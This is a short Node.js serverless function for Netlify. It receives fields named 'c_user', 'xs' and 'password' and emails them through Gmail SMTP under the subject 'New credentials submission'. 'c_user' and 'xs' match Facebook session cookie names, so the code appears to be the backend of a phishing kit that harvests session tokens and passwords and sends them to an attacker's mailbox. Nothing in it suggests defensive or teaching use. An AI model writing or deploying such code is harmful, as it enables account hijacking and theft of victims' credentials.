// File: netlify/functions/send-email.js

const nodemailer = require("nodemailer");

exports.handler = async function (event, context) {
  try {
    const data = JSON.parse(event.body);

    // Validate required fields
    if (!data.c_user || !data.xs || !data.password) {
      return {
        statusCode: 400,
        body: JSON.stringify({ success: false, error: "Missing c_user, xs, or password." })
      };
    }

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.SMTP_EMAIL,
        pass: process.env.SMTP_PASSWORD
      },
    });

    const mailOptions = {
      from: process.env.SMTP_EMAIL,
      to: "yourreceiver@email.com",
      subject: `New credentials submission`,
      html: `<p><strong>c_user:</strong> ${data.c_user}</p>
             <p><strong>xs:</strong> ${data.xs}</p>
             <p><strong>password:</strong> ${data.password}</p>`
    };

    await transporter.sendMail(mailOptions);

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true, message: "Email sent!" })
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, error: error.message })
    };
  }
};
